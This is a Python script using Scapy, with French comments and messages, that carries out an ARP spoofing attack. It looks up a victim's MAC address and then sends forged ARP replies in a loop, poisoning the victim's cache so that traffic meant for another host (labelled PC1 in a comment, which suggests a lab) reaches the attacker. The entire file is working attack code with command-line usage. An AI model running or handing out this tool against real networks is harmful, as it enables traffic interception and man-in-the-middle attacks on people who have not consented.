from scapy.all import *
import sys
import time

def get_mac(ip):
    """
    Envoie une requête ARP pour obtenir l'adresse MAC associée à une adresse IP.
    """
    answered, unanswered = sr(ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

def arp_spoof(victim_ip, spoof_ip):
    """
    Lance une attaque ARP spoofing contre une cible.
    victim_ip : L'adresse IP de la cible (par exemple PC2).
    spoof_ip : L'adresse IP à usurper (par exemple PC1).
    """
    victim_mac = get_mac(victim_ip)
    if not victim_mac:
        print(f"Impossible d'obtenir l'adresse MAC de la cible {victim_ip}.")
        sys.exit(1)
    
    print(f"[INFO] Victime : {victim_ip} ({victim_mac}) | IP usurpée : {spoof_ip}")
    
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    try:
        while True:
            send(packet, verbose=False)
            print(f"[INFO] Envoi ARP Reply à {victim_ip} (IP source usurpée : {spoof_ip})")
            time.sleep(2)  # Envoi des paquets toutes les 2 secondes
    except KeyboardInterrupt:
        print("\n[INFO] Arrêt de l'attaque. Restaurer le réseau manuellement.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python arp_spoof.py <victim_ip> <spoof_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    spoof_ip = sys.argv[2]

    arp_spoof(victim_ip, spoof_ip)
